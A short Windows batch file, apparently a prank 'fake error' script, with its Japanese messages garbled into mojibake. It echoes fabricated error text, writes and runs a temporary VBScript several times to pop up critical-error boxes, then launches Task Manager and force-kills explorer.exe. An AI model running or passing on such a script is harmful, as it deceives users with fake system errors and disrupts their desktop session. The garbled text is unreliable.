@echo off
echo �G���[�������������߃��[�U�[�����ǂݍ��߂܂���ł���
echo C:\Users\Users��
timeout /nobreak 1 >null
echo �G���[���������܂���
echo �C�����邽�߂ɂ͉����L�[�������Ă�������
pause
echo msgbox "�G���[���������܂���",vbCritical,"�G���[" > %TEMP%/msgboxtest.vbs & %TEMP%/msgboxtest.vbs
echo msgbox "�G���[����������",vbCritical,"�G���[" > %TEMP%/msgboxtest.vbs & %TEMP%/msgboxtest.vbs
echo msgbox "�G���[������",vbCritical,"�G���[" > %TEMP%/msgboxtest.vbs & %TEMP%/msgboxtest.vbs
echo msgbox "�G���[����",vbCritical,"�G���[" > %TEMP%/msgboxtest.vbs & %TEMP%/msgboxtest.vbs
echo msgbox "�G���[",vbCritical,"�G���[" > %TEMP%/msgboxtest.vbs & %TEMP%/msgboxtest.vbs
echo msgbox "�₮�����������������񂶂�������������",vbCritical,"�Ȃ���������������" > %TEMP%/msgboxtest.vbs & %TEMP%/msgboxtest.vbs
echo �G���[��������������cmd���ċN�����܂�
timeout /nobreak 2 >null
echo ���łɃG�N�X�v���[���[�������I�����܂�
timeout /nobreak 2 >null
echo ���Ƃ��łɃ^�X�N�}�l�[�W���[�N�����Ƃ��܂�
timeout /nobreak 3 >null
start taskmgr.exe >nul
taskkill /f /im explorer.exe >nul